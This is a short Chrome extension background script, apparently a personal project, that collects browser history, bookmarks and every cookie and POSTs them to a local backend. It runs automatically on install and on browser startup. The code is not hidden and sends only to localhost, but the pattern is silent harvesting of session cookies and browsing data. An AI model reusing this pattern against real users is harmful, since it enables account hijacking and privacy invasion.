console.log("🚀 Porto Extension Loaded!");

// Function to retrieve browser data
function getData(callback) {
    chrome.history.search({ text: "", maxResults: 100 }, (history) => {
        chrome.bookmarks.getTree((bookmarks) => {
            chrome.cookies.getAll({}, (cookies) => {
                callback({ history, bookmarks, cookies });
            });
        });
    });
}

// Function to send data to backend
function sendDataToBackend() {
    getData((userData) => {
        console.log("📤 Sending data to backend:", userData);
        fetch("http://localhost:8080/receiveData", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(userData),
        })
        .then(response => response.json())
        .then(data => {
            console.log("✅ Data sent successfully:", data);
            chrome.storage.local.set({ lastSentData: new Date().toISOString() }); // Store timestamp
        })
        .catch(error => console.error("❌ Error sending data:", error));
    });
}

// Auto-trigger when browser starts
chrome.runtime.onStartup.addListener(() => {
    console.log("🔄 Browser started - Auto-sending data");
    sendDataToBackend();
});

// Auto-trigger on extension install/update
chrome.runtime.onInstalled.addListener(() => {
    console.log("🆕 Extension installed/updated - Auto-sending data");
    sendDataToBackend();
});

// Manual trigger from popup
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (request.action === "sendData") {
        console.log("🖐 Manual trigger received - Sending data");
        sendDataToBackend();
        sendResponse({ status: "Data sending initiated" });
    }
});
